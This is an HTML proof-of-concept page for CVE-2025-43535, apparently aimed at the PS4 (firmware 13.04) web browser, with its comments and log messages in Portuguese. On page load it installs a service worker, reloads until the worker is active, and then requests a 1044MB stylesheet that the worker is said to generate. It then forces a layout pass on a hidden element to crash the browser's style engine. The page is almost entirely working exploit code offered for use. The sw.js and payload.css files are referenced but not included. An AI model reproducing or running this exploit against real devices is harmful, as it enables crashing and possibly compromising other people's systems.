<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 (Remote PoC)</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · PS4 FW 13.04 (GitHub Mode)</div>
<div id="log"></div>
<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

async function run() {
  L('Iniciando PoC Remoto via Service Worker...', 'warn');

  if (!('serviceWorker' in navigator)) {
    L('Erro: Service Worker não suportado ou bloqueado.', 'fail');
    return;
  }

  try {
    // 1. Instala o "Servidor Virtual"
    await navigator.serviceWorker.register('sw.js');
    L('Service Worker instalado no GitHub Pages.', 'ok');

    // Aguarda o SW assumir o controle (necessário na primeira visita)
    if (!navigator.serviceWorker.controller) {
      L('Aguardando controle do SW... A página vai recarregar automaticamente.', 'warn');
      setTimeout(() => window.location.reload(), 1500);
      return;
    }

    L('SW ativo. O JS consumirá quase 0MB de RAM a partir de agora.', 'ok');
    L('Solicitando 1044MB de CSS diretamente para o C++...', 'warn');

    // 2. Dispara a requisição. O SW vai interceptar 'payload.css'
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'payload.css'; 

    link.onload = () => {
      L('1044MB Carregados no C++. Disparando Style Resolver...', 'warn');
      const el = document.createElement('div');
      el.className = 't';
      document.getElementById('stage').appendChild(el);

      setTimeout(() => {
        try {
          void el.offsetWidth; // O gatilho mortal
          L('Sobreviveu ao layout. (Não deu crash)', 'ok');
        } catch(e) { L('Falha no layout: ' + e, 'fail'); }
      }, 100);
    };

    link.onerror = () => L('Erro na rede. O SW falhou em gerar o payload.', 'fail');

    L('Aguarde. O PS4 vai processar silenciosamente...', 'info');
    document.head.appendChild(link);

  } catch (error) {
    L('Falha Crítica: ' + error, 'fail');
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
